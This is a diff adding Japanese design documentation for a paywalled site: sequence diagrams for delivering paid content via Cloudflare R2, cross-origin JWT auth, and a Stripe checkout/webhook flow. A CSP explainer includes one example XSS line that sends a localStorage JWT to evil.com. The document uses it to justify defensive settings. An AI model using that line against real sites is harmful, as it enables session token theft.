@@ -217,3 +217,308 @@ pnpm tsx apps/static-builder/src/cli.ts sync-r2 --site v0
 - Cloudflare Images/Resizing上で保護: コスト上昇。R2 + 事前最適化が基本方針
 - 完全暗号化のみ: 実装・UXが重い。まずはプレースホルダ、必要箇所に暗号化を併用
 
+## プレースホルダー形式のシーケンス図
+
+
+```mermaid
+sequenceDiagram
+    participant User as ユーザー（ブラウザ）
+    participant Client as クライアント（React）
+    participant Gateway as Cloudflare Gateway
+    participant R2 as Cloudflare R2
+
+    User->>Client: 有料セクションを表示
+    Client->>Gateway: GET /api/paid-content<br/>?siteId&slug&sectionId
+    
+    Gateway->>Gateway: JWT検証<br/>（Cookie or Authorization）
+    
+    alt 権限なし
+        Gateway-->>Client: 403 Forbidden
+        Client-->>User: Paywall表示（購入促進）
+    else 権限あり
+        Gateway->>R2: 署名URL生成リクエスト<br/>paid/{siteId}/{slug}/{sectionId}.json
+        R2-->>Gateway: 署名URL（短命: 数分）
+        Gateway-->>Client: 200 OK { url, ttl }
+        Client->>R2: GET 署名URL
+        R2-->>Client: 有料コンテンツJSON { html }
+        Client->>Client: hydrate & 描画
+        Client-->>User: 有料コンテンツ表示
+    end
+```
+
+## 暗号化チャンク方式
+
+```mermaid
+sequenceDiagram
+    participant User as ユーザー（ブラウザ）
+    participant Client as クライアント（React）
+    participant Gateway as Cloudflare Gateway
+    participant R2 as Cloudflare R2
+
+    User->>Client: 有料セクションを表示
+    Client->>Gateway: GET /api/paid-content-token<br/>?siteId&slug&sectionId
+    
+    Gateway->>Gateway: JWT検証<br/>（Cookie or Authorization）
+    
+    alt 権限なし
+        Gateway-->>Client: 403 Forbidden
+        Client-->>User: Paywall表示（購入促進）
+    else 権限あり
+        Gateway->>R2: 署名URL生成リクエスト<br/>paid-enc/{siteId}/{slug}/{sectionId}.bin
+        R2-->>Gateway: 署名URL
+        Gateway->>Gateway: 復号用トークン生成<br/>（短命: 1分, 1回限り）
+        Gateway-->>Client: 200 OK { url, token, alg, exp }
+        Client->>R2: GET 署名URL
+        R2-->>Client: 暗号化チャンク（AES-GCM）
+        Client->>Client: トークンから鍵素材導出
+        Client->>Client: 復号 & hydrate & 描画
+        Client-->>User: 有料コンテンツ表示
+    end
+```
+
+### ビルド〜配信 全体フロー
+
+```mermaid
+sequenceDiagram
+    participant Dev as 開発者
+    participant CI as CI/CD
+    participant MDX as MDX Pipeline
+    participant R2 as Cloudflare R2
+    participant CDN as Cloudflare CDN
+    participant KV as Cloudflare KV
+
+    Dev->>CI: git push（MDXファイル変更）
+    CI->>MDX: ビルド開始
+    
+    MDX->>MDX: 変更検出<br/>（git diff / タイムスタンプ）
+    MDX->>MDX: MDX→AST解析
+    MDX->>MDX: [premium]〜[/premium]<br/>ノード検出・抽出
+    
+    par 有料コンテンツ処理
+        MDX->>MDX: 有料本文をJSON化<br/>（or 暗号化）
+        MDX->>R2: アップロード<br/>paid/{siteId}/{slug}/{sectionId}.json
+    and 無料コンテンツ処理
+        MDX->>MDX: プレースホルダ差し替え
+        MDX->>MDX: 静的HTML生成
+        MDX->>CDN: デプロイ<br/>（無料部分のみ）
+    end
+    
+    MDX->>KV: メタ情報更新<br/>{siteId, slug} → sectionMeta[]
+    MDX->>CDN: Cache-Tagパージ
+    
+    CI-->>Dev: ビルド完了通知
+```
+
+## クロスオリジンでの閲覧権限保持の仕組み
+
+### 課題
+
+有料ページのサイト（例: `v0.example.com`）とCloudflare Gateway（`api.ai-pit.net`）のオリジンが異なるため、Cookieでの認証情報共有が困難。
+
+### 採用方式: トークン運用（Authorization Bearer）
+
+クロスオリジン環境でもCORS設定により動作可能な方式を採用。
+
+```mermaid
+sequenceDiagram
+    participant User as ユーザー
+    participant Site as 有料サイト<br/>(v0.example.com)
+    participant Gateway as Gateway API<br/>(api.ai-pit.net)
+    participant Stripe as Stripe
+
+    User->>Site: 有料コンテンツにアクセス
+    Site-->>User: Paywall表示（ログイン促進）
+    
+    User->>Gateway: POST /auth/request_link<br/>{email}
+    Gateway->>User: マジックリンクをメール送信
+    
+    User->>Gateway: GET /auth/verify?token=xxx
+    Gateway-->>User: JWT発行
+    
+    User->>Site: JWTをlocalStorageに保存
+    
+    Note over User,Site: 以降の有料コンテンツ取得
+    
+    Site->>Gateway: GET /api/paid-content<br/>Authorization: Bearer <JWT>
+    Gateway->>Gateway: JWT検証 + 権限確認
+    Gateway-->>Site: 署名URL返却
+    Site-->>User: 有料コンテンツ表示
+```
+
+### 技術詳細
+
+| 項目 | 内容 |
+|------|------|
+| JWT保存場所 | localStorage（ブラウザ） |
+| 認証ヘッダー | `Authorization: Bearer <jwt>` |
+| CORS設定 | Gateway側でsites登録ドメインのみ許可（D1で管理） |
+| JWT有効期限 | 短寿命（例: 1時間）、リフレッシュトークン併用 |
+:::note CSPとは
+
+**CSP（Content Security Policy）** は、Webサイトが「どこからリソースを読み込んでよいか」をブラウザに指示するセキュリティ機能です。
+
+HTTPヘッダーでポリシーを指定します：
+
+```http
+Content-Security-Policy: script-src 'self' https://trusted.com;
+```
+
+この例では「自サイトと trusted.com からのスクリプトのみ実行可」という意味です。
+
+**XSS対策としての役割**
+
+localStorageにJWTを保存する場合、XSS（クロスサイトスクリプティング）攻撃でトークンが盗まれるリスクがあります。
+
+_攻撃者が注入した悪意あるスクリプト_
+```javascript
+fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'));
+```
+
+CSPを設定すると、許可されていないスクリプトの実行をブラウザがブロックします：
+
+_CSP設定_
+```http
+Content-Security-Policy: 
+  script-src 'self';           # 自サイトのスクリプトのみ
+  connect-src 'self' https://api.ai-pit.net;  # API通信先を制限
+```
+
+CSPは「保険」であり、XSS脆弱性そのものを防ぐわけではありません。localStorageにJWTを保存する方法は、CSPを設定しても**HttpOnly Cookieより安全性は劣ります**。ただしクロスオリジン環境では現実的な妥協点として広く使われています（SPAアプリなど）。より安全性を求めるなら、先ほどの方法2（サブドメイン統一でCookie共有）や方法3（BFF）を検討する価値があります。
+
+:::
+### セキュリティ対策（必須）
+
+localStorageはXSS攻撃に脆弱なため、以下の対策を徹底：
+
+1. **CSP（Content Security Policy）の設定**
+2. **入力値のサニタイズ徹底**（XSS脆弱性の排除）
+3. **JWT有効期限を短く設定**（漏洩時の被害軽減）
+
+### 代替案（将来検討）
+
+| 方式            | 概要                                           | メリット           | デメリット          |
+| ------------- | -------------------------------------------- | -------------- | -------------- |
+| 方法2: サブドメイン統一 | `v0.ai-pit.net` + `api.ai-pit.net` でCookie共有 | HttpOnlyで安全    | サイトごとにサブドメイン必要 |
+| 方法3: BFF      | Next.js API Routeでプロキシ                       | JWTがブラウザに露出しない | 実装が複雑          |
+
+MVP段階では方法1（トークン運用）で開始し、必要に応じて方法2への移行を検討する。
+
+## Paywall → Stripe決済 → 有料コンテンツ閲覧フロー
+
+### 前提条件
+- ユーザーは未ログイン or ログイン済みだが該当商品の閲覧権限なし
+- Stripe Checkout Session を使用（Stripeホスト型決済ページ）
+
+### シーケンス図
+
+```mermaid
+sequenceDiagram
+    participant User as ユーザー
+    participant Site as 有料サイト<br/>(v0.example.com)
+    participant Gateway as Gateway API<br/>(api.ai-pit.net)
+    participant Stripe as Stripe
+    participant D1 as D1 Database
+
+    Note over User,D1: 1. 有料コンテンツへのアクセス（未購入）
+    
+    User->>Site: 有料ページにアクセス
+    Site->>Gateway: GET /api/paid-content<br/>Authorization: Bearer <JWT> or なし
+    Gateway->>D1: 権限確認（entitlements）
+    D1-->>Gateway: 権限なし
+    Gateway-->>Site: 403 Forbidden
+    Site-->>User: Paywall表示<br/>「この続きを読むには購入が必要です」
+
+    Note over User,D1: 2. ログイン（未ログインの場合）
+    
+    alt 未ログインの場合
+        User->>Site: 「ログイン」クリック
+        Site->>Gateway: POST /auth/request_link<br/>{email}
+        Gateway->>User: マジックリンクをメール送信
+        User->>Gateway: GET /auth/verify?token=xxx
+        Gateway->>D1: ユーザー作成/取得
+        Gateway-->>User: JWT発行
+        User->>Site: JWTをlocalStorageに保存
+    end
+
+    Note over User,D1: 3. Stripe決済フロー
+    
+    User->>Site: 「購入する」クリック
+    Site->>Gateway: POST /api/checkout/create<br/>{productId, successUrl, cancelUrl}<br/>Authorization: Bearer <JWT>
+    Gateway->>D1: ユーザー情報取得
+    Gateway->>Stripe: Create Checkout Session<br/>{price, customer_email, metadata}
+    Stripe-->>Gateway: session.url
+    Gateway-->>Site: {checkoutUrl}
+    Site->>User: Stripeチェックアウトページへリダイレクト
+    
+    User->>Stripe: 決済情報入力・決済実行
+    Stripe-->>User: 決済完了、successUrlへリダイレクト
+
+    Note over User,D1: 4. Webhook による権限付与（非同期）
+    
+    Stripe->>Gateway: POST /api/stripe/webhook<br/>checkout.session.completed
+    Gateway->>Gateway: Webhook署名検証
+    Gateway->>D1: INSERT entitlements<br/>{user_id, product_id, status: 'active'}
+    Gateway-->>Stripe: 200 OK
+
+    Note over User,D1: 5. 有料コンテンツ閲覧
+    
+    User->>Site: successUrlに到着<br/>（購入完了ページ）
+    Site->>Gateway: GET /api/paid-content<br/>Authorization: Bearer <JWT>
+    Gateway->>D1: 権限確認（entitlements）
+    D1-->>Gateway: 権限あり（active）
+    Gateway->>Gateway: R2署名URL生成
+    Gateway-->>Site: {url, ttl}
+    Site->>Site: 署名URLからコンテンツ取得
+    Site-->>User: 有料コンテンツ表示
+```
+
+### 補足: Webhook処理のタイミング
+
+決済完了からWebhook到着まで数秒のラグがあるため、successUrl到着直後は権限が反映されていない可能性がある。
+
+**対策案**:
+1. **ポーリング**: successUrlページで数秒間ポーリングして権限確認
+2. **楽観的表示**: successUrlでは「購入完了」を表示し、実際のコンテンツは再読み込み後に表示
+3. **Session ID検証**: Checkout Session IDを使ってGateway側で直接Stripeに確認
+
+```mermaid
+sequenceDiagram
+    participant User as ユーザー
+    participant Site as 有料サイト
+    participant Gateway as Gateway API
+    participant Stripe as Stripe
+
+    Note over User,Stripe: successUrl到着時の権限確認（ポーリング方式）
+    
+    User->>Site: successUrl?session_id=xxx に到着
+    
+    loop 最大5回（1秒間隔）
+        Site->>Gateway: GET /api/paid-content<br/>Authorization: Bearer <JWT>
+        alt 権限あり
+            Gateway-->>Site: 200 OK {url}
+            Site-->>User: 有料コンテンツ表示
+        else 権限なし（Webhook未到着）
+            Gateway-->>Site: 403 Forbidden
+            Site->>Site: 1秒待機
+        end
+    end
+    
+    alt タイムアウト
+        Site-->>User: 「購入処理中です。<br/>しばらくしてから再読み込みしてください」
+    end
+```
+
+### API エンドポイント（追加）
+
+| エンドポイント | メソッド | 説明 |
+|---------------|---------|------|
+| `/api/checkout/create` | POST | Stripe Checkout Session作成 |
+| `/api/stripe/webhook` | POST | Stripe Webhookハンドラー |
+
+### Stripe Webhook イベント
+
+| イベント | 処理内容 |
+|---------|---------|
+| `checkout.session.completed` | entitlements に権限追加（status: active） |
+| `customer.subscription.deleted` | entitlements を revoked に更新（サブスク解約時） |
+| `invoice.payment_failed` | 通知 or 一時停止処理 |
